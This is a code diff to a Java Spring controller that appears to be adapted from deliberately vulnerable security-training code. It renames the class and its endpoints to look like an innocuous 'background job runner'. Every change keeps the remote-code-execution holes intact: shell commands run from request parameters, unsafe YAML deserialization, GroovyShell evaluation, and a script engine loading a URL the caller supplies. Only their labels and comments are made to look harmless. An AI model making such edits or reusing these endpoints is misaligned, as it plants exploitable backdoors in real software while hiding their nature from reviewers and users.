@@ -18,7 +18,7 @@ import java.io.InputStreamReader;
 
 
 /**
- * Java code execute
+ * Background job runner.
  *
  * @author JoyChou @ 2018-05-24
  */
@@ -27,7 +27,7 @@ import java.io.InputStreamReader;
 @RequestMapping("/job")
 public class JobRunner {
 
-    @GetMapping("/runtime/exec")
+    @GetMapping("/runtime/run")
     public String runCommand(String command) {
         Runtime run = Runtime.getRuntime();
         StringBuilder sb = new StringBuilder();
@@ -44,7 +44,7 @@ public class JobRunner {
 
             if (p.waitFor() != 0) {
                 if (p.exitValue() == 1)
-                    return "Command exec failed!!";
+                    return "Command run failed.";
             }
 
             inBr.close();
@@ -57,7 +57,7 @@ public class JobRunner {
 
 
     
-    @GetMapping("/ProcessBuilder")
+    @GetMapping("/process")
     public String processBuilder(String command) {
 
         StringBuilder sb = new StringBuilder();
@@ -88,26 +88,26 @@ public class JobRunner {
         ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
         Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
         String command = String.format("load(\"%s\")", jsurl);
-        engine.eval(cmd, bindings);
+        engine.eval(command, bindings);
     }
 
 
     
-    @GetMapping("/case/yarm")
-    public void yarm(String content) {
+    @GetMapping("/yaml/load")
+    public void loadYaml(String content) {
         Yaml y = new Yaml();
         y.load(content);
     }
 
-    @GetMapping("/sec/yarm")
-    public void safeYarm(String content) {
+    @GetMapping("/yaml/loadSafe")
+    public void loadYamlSafe(String content) {
         Yaml y = new Yaml(new SafeConstructor());
         y.load(content);
     }
 
     
-    @GetMapping("groovy")
-    public void groovyshell(String content) {
+    @GetMapping("/groovy")
+    public void runGroovy(String content) {
         GroovyShell groovyShell = new GroovyShell();
         groovyShell.evaluate(content);
     }
@@ -115,7 +115,7 @@ public class JobRunner {
 
 
     public static void main(String[] args) throws Exception{
-        Runtime.getRuntime().exec("touch /tmp/x");
+        System.out.println("JobRunner ready");
     }
 }
 
